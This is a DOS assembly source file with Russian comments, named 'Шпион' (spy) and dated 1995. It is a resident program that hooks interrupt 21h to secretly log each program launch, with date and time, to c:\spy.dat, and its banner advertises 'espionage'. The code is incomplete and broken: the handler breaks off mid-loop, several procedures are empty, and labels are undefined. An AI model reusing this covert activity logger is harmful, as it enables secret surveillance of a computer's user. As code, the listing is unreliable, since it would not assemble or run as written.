;--------------------
;       Шпион
;--------------------
        .MODEL tiny
        .CODE
        .STARTUP

;        xor     ax,ax
;        jz      init
        jmp      init
kod     dw      00h
date    dw      ?
time    dw      ?
handle  dw      0ffffh
fname    db      128     dup(?)
;---------------------------
; Обработчик  21h прерывания
;---------------------------
interrupt   proc  near
            cmp   ax,4b00h
            jne   quit00
            push  ax
            push  bx
            push  cx
            push  si
            push  di
            push  es
            push  dx
            push  ds
            push  cs
            pop   ds
            mov   kod,ax
            call  date_time   ; получить  время в упакованном формате
            call  open        ; открыть файл
            je    quit10
; Запись данных (6 байт) в файл
            mov   bx,handle
            mov   ah,40h
            lea   dx,kod
            mov   cx,06
            int   7dh
            jc    quit20
            pop   ds   ; - исходные, т.е. ds и dx при входе в обработчик
            pop   dx   ; /
            push  ds   ; - еще пригодятся
            push  dx   ; /
            mov   bx,dx
            xor   ax,ax
            mov   si,ax
next:
            inc   si



interrupt   endp

;------------------------------
init    proc    near
        call    date_time
        mov     ax,3306h
        int     21h
        cmp     bl,5
        jl      exit
        xor     ax,ax
        mov     es,ax
        mov     si,84h
        push    ds
        push    es
        pop     ds
        mov     di,1f4h
        mov     cx,4
        cli
        rep     movsb
        mov     word ptr es:[84h],offset interrupt
        mov     word ptr es:[86h],cs
        sti
        pop     ds
        xor     si,si
repeat:
        mov     al,file[si]
        mov     fname[si],al
        inc     si
        or      al,al
        jnz     repeat
        mov     len,si
;---    ------     --------
        call    open
        mov     bx,ax
        mov     ah,40h
        lea     dx,kod
        inc     dx
        mov     cx,5
        int     7dh
        jc      exit
        mov     si,2ch
        mov     es,[si]
        mov     ah,49h
        int     7dh     ; free  block  around
        mov     ah,9h
        mov     dx,offset hello
        int     7dh
        mov     ax,3100h
        mov     dx,offset resident
        add     dx,len
        shr     dx,1
        shr     dx,1
        shr     dx,1
        shr     dx,1
        inc     dx
        int     7dh
exit:
        int     20h
;-----------------------------
hello   db      "Тайный  агент, занимающийся  шпионажем"
        db      13,10,"Copyright  (C) fox  v 1.0 , 1995",13,"$"
len     dw      0000h
file    db      "c:\spy.dat",0
;------------------------------
init    endp
;-----------------------------
open    proc    near

open    endp
;-------------------------------
close   proc    near

close   endp
;------------------------------
date_time  proc     near

date_time  endp
           end


